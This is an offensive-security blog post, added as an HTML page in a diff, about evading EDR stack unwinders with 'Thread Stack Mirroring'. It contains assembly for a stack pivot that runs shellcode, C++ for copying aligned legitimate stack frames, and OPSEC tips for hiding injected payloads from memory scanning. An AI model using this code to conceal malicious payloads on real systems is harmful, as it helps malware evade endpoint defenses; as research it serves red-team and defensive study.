@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Evading_EDR_Stack_Unwinders | Offensive32 Labs Blog</title>
+<meta name="description" content="Advanced EDR evasion techniques using thread stack mirroring to bypass stack unwinders.">
+<meta name="robots" content="index, follow, max-image-preview:large">
+<meta name="author" content="msdbg">
+<link rel="canonical" href="https://blog.offensive32.com/p/synthetix-v1-evading-edr-stack-unwinders-with-thread-stack-mirroring/">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Offensive32 Labs Blog">
+<meta property="og:title" content="Evading_EDR_Stack_Unwinders">
+<meta property="og:description" content="Advanced EDR evasion techniques using thread stack mirroring to bypass stack unwinders.">
+<meta property="og:url" content="https://blog.offensive32.com/p/synthetix-v1-evading-edr-stack-unwinders-with-thread-stack-mirroring/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Evading_EDR_Stack_Unwinders">
+<meta name="twitter:description" content="Advanced EDR evasion techniques using thread stack mirroring to bypass stack unwinders.">
+<meta name="o32:legacy-id" content="synthetix-v1-evading-edr-stack-unwinders-with-thread-stack-mirroring">
+<meta name="theme-color" content="#0a0a0a">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%230a0a0a'/%3E%3Ctext x='6' y='22' font-family='monospace' font-size='16' fill='%2300fff9'%3E%3E_%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="/style.css">
+<script type="application/ld+json">
+{"@context": "https://schema.org", "@type": "BlogPosting", "headline": "Evading_EDR_Stack_Unwinders", "description": "Advanced EDR evasion techniques using thread stack mirroring to bypass stack unwinders.", "datePublished": "2026-02-13", "author": {"@type": "Person", "name": "msdbg"}, "mainEntityOfPage": "https://blog.offensive32.com/p/synthetix-v1-evading-edr-stack-unwinders-with-thread-stack-mirroring/", "url": "https://blog.offensive32.com/p/synthetix-v1-evading-edr-stack-unwinders-with-thread-stack-mirroring/"}
+</script>
+</head>
+<body>
+<div class="scanline"></div>
+<div class="noise"></div>
+<header class="header">
+<div class="glitch" data-text="[ OFFENSIVE32_LABS_BLOGSITE ]">[ OFFENSIVE32_LABS_BLOGSITE ]</div>
+<div class="subtitle">// unauthorized access logged</div>
+</header>
+<main class="terminal">
+<p style="margin:1rem 0"><a href="/">&larr; back to terminal</a> &nbsp;|&nbsp; <a href="/#post/synthetix-v1-evading-edr-stack-unwinders-with-thread-stack-mirroring">open in terminal view</a></p>
+<article class="post-article">
+<h1>Evading_EDR_Stack_Unwinders</h1>
+<p class="post-meta">// DECRYPTED: 2026-02-13 | AUTHOR: msdbg | LEGACY: #post/synthetix-v1-evading-edr-stack-unwinders-with-thread-stack-mirroring</p>
+<div class="post-tags"><span class="tag">edr</span><span class="tag">evasion</span><span class="tag">security</span><span class="tag">windows</span></div>
+<div class="post-body"><hr />
+<h1>Evading EDR Stack Unwinders with Thread Stack Mirroring</h1>
+<h2>Beyond JMP RBX: Thread Stack Mirroring for EDR Evasion</h2>
+<h2>Introduction</h2>
+<p>If you work in offensive security or malware research, you know that the era of memory scanning has shifted. Modern EDRs don't just scan memory pages for malicious signatures; they analyze the execution flow of threads. Specifically, they perform <strong>Virtual Stack Unwinding</strong>.</p>
+<p>For a long time, the solution was <strong>Return Address Spoofing</strong>—manipulating the stack to place a legitimate return address (like a <code>JMP RBX</code> gadget in <code>kernel32.dll</code>) at the top.</p>
+<p>However, while I was building a spoofer, I found that traditional spoofing is fragile. It crashes on complex APIs due to register clobbering, and it is becoming increasingly easy to signature.</p>
+<p>This post details my journey moving from basic spoofing to a recent technique: <strong>Thread Stack Mirroring</strong>, and the technical challenges of implementing it in C++ and Assembly on x64.</p>
+<hr />
+<h2>Why &quot;JMP RBX&quot; Isn't Enough</h2>
+<p>In my initial spoofer, I pushed a fake return address onto the stack that pointed to a <code>JMP RBX</code> instruction in <code>kernel32.dll</code>.</p>
+<p>It worked for <code>Sleep()</code>. It failed miserably for <code>MessageBoxA()</code>.</p>
+<p>The reason lies in the <strong>Windows x64 Application Binary Interface (ABI)</strong>.</p>
+<p>In x64, registers like <strong>RBX, RBP, RDI, RSI, and R12-R15</strong> are <strong>non-volatile</strong>. This means if a function (like <code>MessageBoxA</code>) uses them, it must save their state and restore them before returning.</p>
+<p>Because my spoofer relied on RBX holding the real return address, and <code>MessageBoxA</code> used RBX for its own internal logic, the register was <strong>clobbered</strong>. When the API returned to my gadget, RBX no longer held the address of my shellcode. The program jumped to a random memory location and threw an <code>0xC0000005</code> Access Violation.</p>
+<hr />
+<h2>Thread Stack Mirroring</h2>
+<p>I moved away from &quot;faking&quot; a single frame and towards &quot;cloning&quot; a valid history.</p>
+<p><strong>Thread Stack Mirroring</strong> involves allocating a secondary &quot;Shadow Stack,&quot; capturing the actual legitimate stack frames of the current thread (which trace back to <code>main</code> and <code>BaseThreadInitThunk</code>), and copying them to the shadow stack.</p>
+<p>When we pivot execution to this shadow stack, the EDR analyzing the thread sees a chain of return addresses belonging to legitimate modules.</p>
+<h3>1. The Assembly Pivot</h3>
+<p>I wrote a custom Assembly function that performs the context switch. It must be perfectly symmetrical to prevent crashes.</p>
+<pre><code class="language-assembly">ExecutePivoted PROC
+    ; [1] Preserve Non-Volatile Registers
+    ; We must save R12-R15, RDI, RSI, RBX, and RBP.
+    ; If we don't, the host process (e.g., explorer.exe) will crash 
+    ; when our shellcode returns.
+    push rbp
+    push rbx
+    push rsi
+    push rdi
+    push r12
+    push r13
+    push r14
+    push r15
+    
+    ; [2] Save the Real Stack Pointer
+    mov r11, rsp
+    
+    ; [3] The Pivot
+    ; RDX holds the address of our &quot;Mirrored&quot; stack.
+    ; We swap the stack pointer to point to our fake history.
+    mov rsp, rdx
+    
+    ; [4] Link Back Home
+    ; We push the REAL RSP onto the FAKE stack.
+    ; This allows us to restore the stack later.
+    push r11
+    
+    ; [5] Execute Payload
+    sub rsp, 40     ; Allocate Shadow Space (Win x64 requirement)
+    call rcx        ; Call the shellcode entry point
+    add rsp, 40     ; Clean up shadow space
+    
+    ; [6] Restore State
+    pop r11         ; Recover the original stack pointer
+    mov rsp, r11    ; Pivot back to reality
+    
+    ; [7] Restore Registers
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    pop rdi
+    pop rsi
+    pop rbx
+    pop rbp
+    
+    ret
+ExecutePivoted ENDP
+</code></pre>
+<h3>2. The Alignment</h3>
+<p>Here we leave the Assembly and move to C++. This is where I encountered the most annoying part: <strong>Stack Alignment</strong>.</p>
+<p>The x64 ABI mandates that the Stack Pointer (RSP) must be <strong>16-byte aligned</strong> before a function call. If it isn't, SIMD instructions (like <code>movaps</code>, common in the C runtime) will crash.</p>
+<p>If we blindly <code>memcpy</code> the legitimate stack to a new buffer, we might shift the alignment. For example, if the buffer starts at address <code>0x...08</code> but the original stack was aligned to <code>0x...00</code>, the offset destroys the alignment.</p>
+<p>I implemented a dynamic fix that calculates the exact offset of the original stack and replicates it in the mirror:</p>
+<pre><code class="language-cpp">// First we capture the legitimate context
+CONTEXT ctx;
+ctx.ContextFlags = CONTEXT_CONTROL;
+RtlCaptureContext(&amp;ctx);
+
+// Then we match the exact alignment offset of the original stack
+// If ctx.Rsp ends in 0x8, our mirror must also end in 0x8 relative to the 16-byte boundary
+uintptr_t originalOffset = ctx.Rsp &amp; 0xF;
+
+// Calculate the top of our allocated buffer
+uintptr_t baseDest = (topOfStack - bytesToMirror - 0x20) &amp; ~0xF;
+
+// Apply the offset
+void* mirrorDest = (void*)(baseDest + originalOffset);
+
+// Copy the legit frames
+memcpy(mirrorDest, (void*)ctx.Rsp, bytesToMirror);
+</code></pre>
+<p>This means that when <code>ExecutePivoted</code> runs, the CPU finds the stack exactly where it wants it to be.</p>
+<h3>3. OPSEC Considerations</h3>
+<p>If we allocate <code>PAGE_EXECUTE_READWRITE</code> (RWX) memory, we instantly burn OPSEC. I've implemented several OPSEC improvements:</p>
+<ul>
+<li><strong>Allocate RW</strong>: <code>VirtualAlloc</code> with <code>PAGE_READWRITE</code></li>
+<li><strong>Copy &amp; Clean</strong>: Copy the shellcode, then immediately <code>RtlSecureZeroMemory</code> the source buffer to wipe the payload from the heap</li>
+<li><strong>Flip to RX</strong>: Use <code>VirtualProtect</code> to switch the memory to <code>PAGE_EXECUTE_READ</code> immediately before the pivot</li>
+</ul>
+<p>This can still be chained with TEB patching, module stomping, or hardware breakpoints.</p>
+<p>EDRs utilizing <strong>ETW-TI</strong> or periodic memory scanning (e.g., <code>Get-InjectedThread</code>) or other heuristics will flag any thread where the RIP points to unbacked executable memory, regardless of how perfect the call stack looks.</p>
+<hr />
+<h2>Core Concepts</h2>
+<p>If you're new to stack evasion, I'd recommend looking up these concepts first:</p>
+<ul>
+<li>
+<p><strong>The x64 ABI (Application Binary Interface)</strong>: Windows x64 architecture dictates how functions call each other. Crucially, it defines <strong>Non-Volatile Registers</strong> (RBX, RBP, RDI, RSI, R12-R15). If a function uses these, it must save their value and restore them before returning.</p>
+</li>
+<li>
+<p><strong>Virtual Stack Unwinding</strong>: The process of tracing a thread's history by reading return addresses off the stack. EDRs use this to determine if a call to <code>Sleep</code> came from a legitimate module (like <code>explorer.exe</code>) or a malicious implant.</p>
+</li>
+<li>
+<p><strong>Register Clobbering</strong>: The failure state of basic spoofers. If you hide your return address in a register (like RBX) and call a complex API (like <code>MessageBoxA</code>), that API will use RBX for its own work, overwriting your return address and causing the program to crash upon return.</p>
+</li>
+<li>
+<p><strong>ETW-TI</strong>: Event Tracing for Windows - Threat Intelligence, an ETW provider used by EDRs to monitor thread context changes and other suspicious activities.</p>
+</li>
+</ul>
+<hr />
+<h2>Demo</h2>
+<h3>1. Executing the Stack Pivot</h3>
+<p>After executing the <code>mov rsp, rdx</code> instruction, we can see the RSP register confirming the stack pointer has been hijacked. Notice the contrast: the original thread stack address is safely preserved in R11 (<code>0x...F938</code>), while RSP now points directly to our dynamically allocated heap mirror at <code>0x...FDE0</code>.</p>
+<p><img src="/assets/posts/synthetix-v1-evading-edr-2026-02-13/SCREEN-SHOT-1.png" alt="alt text" /></p>
+<h3>2. Verifying Payload Memory Permissions</h3>
+<p><img src="/assets/posts/synthetix-v1-evading-edr-2026-02-13/screenshot-2%20%282%29.png" alt="alt text" /></p>
+<p>Once we inspect the process memory, the payload is mapped at <code>0x1fd11d60000</code>. By allocating as RW, writing the payload, and using <code>VirtualProtect</code> to flip to RX, we map the shellcode into private committed memory while avoiding the highly scrutinized RWX memory indicator.</p>
+<h3>3. Execution Confirmation</h3>
+<p><img src="/assets/posts/synthetix-v1-evading-edr-2026-02-13/calc%20%281%29.gif" alt="alt text" /></p>
+<p>Because we properly preserved the non-volatile registers (RBX, RSI, RDI, R12-R15) before the pivot and restored them after, the thread remains perfectly stable once the payload finishes executing.</p>
+<hr />
+<p>The full Proof of Concept is available on <a href="https://github.com/msdbg/synthetixv1">my GitHub</a>.</p>
+</div>
+<hr>
+<p>Share (legacy URL, never breaks): <code>https://blog.offensive32.com/#post/synthetix-v1-evading-edr-stack-unwinders-with-thread-stack-mirroring</code><br>
+Canonical (indexable): <code>https://blog.offensive32.com/p/synthetix-v1-evading-edr-stack-unwinders-with-thread-stack-mirroring/</code></p>
+<p><a href="/">&larr; back to terminal</a></p>
+</article>
+</main>
+<footer class="footer">
+<div class="footer-left"><span class="blink">●</span> CONNECTION_NOT_SECURE</div>
+<div class="footer-right"><span>blog.offensive32.com</span></div>
+</footer>
+</body>
+</html>
